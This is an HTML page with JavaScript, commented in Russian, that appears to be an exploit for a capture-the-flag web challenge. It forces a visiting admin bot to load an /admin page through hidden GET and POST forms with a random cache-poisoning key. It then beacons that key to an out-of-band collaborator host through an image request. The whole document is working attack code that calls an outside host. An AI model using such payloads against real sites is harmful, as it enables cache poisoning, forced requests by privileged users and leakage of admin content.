<!DOCTYPE html>
<script>
const TARGET = 'https://tasks.goidactf.ru:20431';
const CACHE_KEY = 'cache_poison_' + Math.random().toString(36).substr(2);
const COLLAB = 'https://zzvqvwrdwxfyihbbkymvn6unl6cm7zezt.oast.fun';

// 1. Бот посещает админку с уникальным параметром через форму
const form = document.createElement('form');
form.method = 'GET';
form.action = TARGET + '/admin?' + CACHE_KEY;
form.target = '_blank';
form.innerHTML = '<input type="hidden" name="cache_key" value="' + CACHE_KEY + '">';
document.body.appendChild(form);
form.submit();

// 2. Отправляем ключ через Image (без CORS)
new Image().src = COLLAB + '/?cache_key=' + CACHE_KEY;

// 3. Также пробуем POST запрос с параметром
const postForm = document.createElement('form');
postForm.method = 'POST';
postForm.action = TARGET + '/admin?' + CACHE_KEY + '&method=post';
postForm.target = '_blank';
postForm.innerHTML = '<input type="hidden" name="test" value="post_cache">';
document.body.appendChild(postForm);
postForm.submit();
</script>
